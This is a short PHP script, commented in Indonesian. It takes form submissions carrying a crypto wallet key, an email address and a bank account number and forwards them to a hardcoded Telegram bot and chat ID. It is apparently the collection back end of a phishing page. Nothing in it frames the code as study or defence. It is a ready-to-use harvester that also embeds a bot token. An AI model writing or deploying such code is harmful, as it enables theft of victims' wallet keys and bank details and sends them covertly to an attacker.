<?php
// Token bot Telegram dan ID chat
$botToken = "8065985045:AAGFOt5TxtYWXcJbrGmPXPLOetzD25SGZFQ";
$chatId = "820466063"; // Ganti dengan chat ID Anda

// Fungsi untuk mengirim pesan ke Telegram
function sendToTelegram($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    return $result !== false;
}

// Tangkap data dari form
$wallet = htmlspecialchars($_POST['wallet'] ?? 'Tidak diisi');
$email = htmlspecialchars($_POST['email'] ?? 'Tidak diisi');
$account = htmlspecialchars($_POST['account'] ?? 'Tidak diisi');

// Buat pesan yang akan dikirim
$message = "<b>Data Baru Diterima:</b>\n";
$message .= "🔑 <b>Key Wallet:</b> $wallet\n";
$message .= "📧 <b>Email:</b> $email\n";
$message .= "💳 <b>Nomor Rekening:</b> $account\n";

// Kirim ke Telegram
if (sendToTelegram($message, $botToken, $chatId)) {
    echo "<h1>Data berhasil dikirim ke Telegram!</h1>";
} else {
    echo "<h1>Gagal mengirim data ke Telegram.</h1>";
}
?>
